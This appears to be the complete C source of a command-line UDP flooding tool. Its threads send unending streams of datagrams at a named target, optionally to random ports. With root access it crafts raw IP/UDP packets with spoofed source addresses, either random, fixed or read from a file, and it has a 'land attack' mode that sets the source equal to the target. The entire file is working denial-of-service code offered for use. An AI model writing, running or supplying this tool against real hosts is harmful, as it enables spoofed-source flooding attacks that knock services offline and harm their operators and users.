// printf, perror
#include <stdio.h>
// exit, atoi, srand, rand
#include <stdlib.h>
// memset, memcpy, strncpy
#include <string.h>
// getopt, optind, optarg
#include <unistd.h>
// time
#include <time.h>
// pthread_t, pthread_create, pthread_join
#include <pthread.h>
// gethostbyname, herror
#include <netdb.h>
// inet_addr
#include <arpa/inet.h>
// uint8_t, uint16_t, uint32_t
#include <sys/types.h>
// socket, sendto, SOCK_RAW, SOCK_DGRAM
#include <sys/socket.h>
// sockaddr, sockaddr_in, IPPROTO_UDP
#include <netinet/in.h>
#include <netinet/ip.h>
// udphdr
#include <netinet/udp.h>

typedef struct option_t
{
  int size;
  char source[16];
  char filename[32];
  int8_t ssource;
  int8_t rsource;
  int8_t fsource;
  int8_t one;
  int8_t land;
  int8_t rdport;
} option_t;

struct thread_args
{
  struct sockaddr_in *peer;
  socklen_t peer_len;
  option_t *option;
};

struct pseudo_udphdr
{
  in_addr_t up_src;
  in_addr_t up_dst;
  uint8_t up_zero;
  uint8_t up_p;
  uint16_t up_len;
};

void banner(const char *name)
{
  printf("Usage: %s [-1pztrsl] <target>\n\n"
         "flags:\n"
         "\t-1\t\t:: send one dgram and exit\n"
         "\t-p <port>\t:: destination port (by default random for each dgram)\n"
         "\t-z <size>\t:: dgram data length (default 10)\n"
         "\t-f <file>\t:: read source IP and dgram data from file\n"
         "\t-i <threads>\t:: amount of threads to be spun up\n\n"
         "only root:\n"
         "\t-r\t\t:: random source IP for each dgram\n"
         "\t-s <source>\t:: set source IP\n"
         "\t-l\t\t:: land attack\n\n",
         name);
  exit(1);
}

void init_option(option_t *option)
{
  memset(option, 0, sizeof(option_t));
  option->size = 25;
  option->rdport = 1;
}

uint16_t checksum(uint16_t *p, int n)
{
  uint16_t *c = p;
  uint32_t sum = 0;

  while (n > 1)
  {
    sum += *c++;
    n -= 2;
  }
  if (n)
  {
    sum += *(uint8_t *)c;
  }
  while (sum >> 16)
  {
    sum = (sum >> 16) + (sum & 0xffff);
  }

  return (uint16_t)(~sum);
}

void *sendto_nonroot(void *args)
{
  struct thread_args *targs = (struct thread_args *)args;
  option_t *option = targs->option;
  char packet[128];
  int sock;

  if ((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
  {
    perror("socket()");
    return NULL;
  }
  memset(packet, 'x', option->size);
  do
  {
    if (option->rdport)
    {
      targs->peer->sin_port = htons(rand() & 65535);
    }
    sendto(sock, packet, option->size, 0, (struct sockaddr *)targs->peer, targs->peer_len);
  } while (!option->one);

  return NULL;
}

void *sendto_root(void *args)
{
  struct thread_args *targs = (struct thread_args *)args;
  option_t *option = targs->option;
  char packet[128];
  struct pseudo_udphdr phdr;
  struct udphdr uhdr;
  struct ip iphdr;
  FILE *fp = NULL;
  void *ptr;
  char src[16];
  int sock, on = 1;
  int phdr_len, uhdr_len, iphdr_len, udppkt_len, ippkt_len;

  if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
  {
    perror("socket()");
    return NULL;
  }
  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
  {
    perror("setsockopt()");
    return NULL;
  }
  if (option->fsource)
  {
    if ((fp = fopen(option->filename, "r")) == NULL)
    {
      perror("fopen()");
      return NULL;
    }
  }
  phdr_len = sizeof(phdr);
  uhdr_len = sizeof(uhdr);
  udppkt_len = uhdr_len + option->size;
  iphdr_len = sizeof(iphdr);
  ippkt_len = iphdr_len + udppkt_len;

  phdr.up_dst = targs->peer->sin_addr.s_addr;
  phdr.up_len = htons(udppkt_len);
  phdr.up_zero = 0;
  phdr.up_p = IPPROTO_UDP;
  uhdr.uh_sport = htons(rand() & 65535);
  uhdr.uh_ulen = htons(udppkt_len);

  iphdr.ip_hl = iphdr_len >> 2;
  iphdr.ip_v = IPVERSION;
  iphdr.ip_ttl = MAXTTL;
  iphdr.ip_tos = 0;
  iphdr.ip_p = phdr.up_p;
  iphdr.ip_off = 0;
  iphdr.ip_id = rand();
  iphdr.ip_len = ippkt_len;
  iphdr.ip_dst.s_addr = phdr.up_dst;

  if (option->ssource)
  {
    phdr.up_src = inet_addr(option->source);
    iphdr.ip_src.s_addr = phdr.up_src;
  }
  if (option->land)
  {
    phdr.up_src = phdr.up_dst;
    uhdr.uh_dport = uhdr.uh_sport;
    iphdr.ip_dst.s_addr = iphdr.ip_src.s_addr = phdr.up_dst;
  }
  memset(&packet[iphdr_len + phdr_len + uhdr_len], 'x', option->size);
  do
  {
    uhdr.uh_sum = 0;
    iphdr.ip_sum = 0;
    ptr = &packet[iphdr_len];
    if (option->fsource)
    {
      memset(src, 0, sizeof(src));
      fgets(src, sizeof(src), fp);
      if (feof(fp))
      {
        if (!option->one)
        {
          if (fseek(fp, 0, SEEK_SET) < 0)
          {
            perror("fseek()");
            return NULL;
          }
        }
        continue;
      }
      else if (ferror(fp))
      {
        perror("ferror()");
        clearerr(fp);
        continue;
      }
    }
    if (option->rsource || option->fsource)
    {
      phdr.up_src = option->fsource ? inet_addr(src) : rand();
      iphdr.ip_src.s_addr = phdr.up_src;
    }
    uhdr.uh_dport = targs->peer->sin_port;
    if (option->rdport)
    {
      uhdr.uh_dport = htons(rand() & 65535);
      if (option->land)
      {
        uhdr.uh_sport = uhdr.uh_dport;
      }
    }
    memcpy(ptr, &phdr, phdr_len);
    memcpy(ptr + phdr_len, &uhdr, uhdr_len);
    uhdr.uh_sum = checksum((uint16_t *)ptr, phdr_len + udppkt_len);
    memcpy(ptr + phdr_len, &uhdr, uhdr_len);
    ptr = &packet[phdr_len];
    memcpy(ptr, &iphdr, iphdr_len);
    iphdr.ip_sum = checksum((uint16_t *)ptr, ippkt_len);
    memcpy(ptr, &iphdr, iphdr_len);
    if (sendto(sock, ptr, ippkt_len, 0, (struct sockaddr *)targs->peer, targs->peer_len) == -1)
    {
      perror("sendto()");
    }
  } while (option->one ? option->fsource && !feof(fp) : 1);

  if (option->fsource)
  {
    fclose(fp);
  }

  return NULL;
}

int main(int argc, char *argv[])
{
  option_t option;
  struct thread_args args;
  struct sockaddr_in peer;
  struct hostent *dns = NULL;
  int arg, dport, nthreads = 1;

  srand(time(NULL));
  init_option(&option);

  while ((arg = getopt(argc, argv, "1p:z:f:rs:li:")) > -1)
  {
    switch (arg)
    {
    case '1':
      option.one = 1;
      break;
    case 'p':
      dport = atoi(optarg);
      option.rdport = 0;
      break;
    case 'z':
      if ((option.size = atoi(optarg)) > 100)
      {
        printf("Datagram data too long (max 100 bytes)\n");
        return 1;
      }
      break;
    case 'f':
      strncpy(option.filename, optarg, sizeof(option.filename));
      option.ssource = 0;
      option.rsource = 0;
      option.fsource = 1;
      option.land = 0;
      break;
    case 'r':
      option.ssource = 0;
      option.rsource = 1;
      option.fsource = 0;
      option.land = 0;
      break;
    case 's':
      strncpy(option.source, optarg, sizeof(option.source));
      option.ssource = 1;
      option.rsource = 0;
      option.fsource = 0;
      option.land = 0;
      break;
    case 'l':
      option.ssource = 0;
      option.rsource = 0;
      option.fsource = 0;
      option.land = 1;
      break;
    case 'i':
      nthreads = atoi(optarg);
      break;
    case '?':
    default:
      exit(1);
    }
  }
  if (argc - optind < 1 || argc - optind > 1)
  {
    banner(argv[0]);
  }
  else if ((dns = gethostbyname(argv[optind])) == NULL)
  {
    herror(argv[optind]);
    return 1;
  }

  peer.sin_family = dns->h_addrtype;
  memcpy(&peer.sin_addr, *dns->h_addr_list, dns->h_length);
  if (!option.rdport)
  {
    peer.sin_port = htons(dport);
  }
  args.peer = &peer;
  args.peer_len = sizeof(peer);
  args.option = &option;

  if (option.rsource || option.ssource || option.fsource || option.land)
  {
    pthread_t threads[nthreads];
    do
    {
      printf("Started thread: %d\n", nthreads);
      pthread_create(&threads[nthreads - 1], NULL, sendto_root, &args);
      nthreads--;
    } while (nthreads > 0);
    pthread_join(threads[0], NULL);
  }
  else
  {
    sendto_nonroot(&args);
  }
  printf("Finished\n");

  return 0;
}
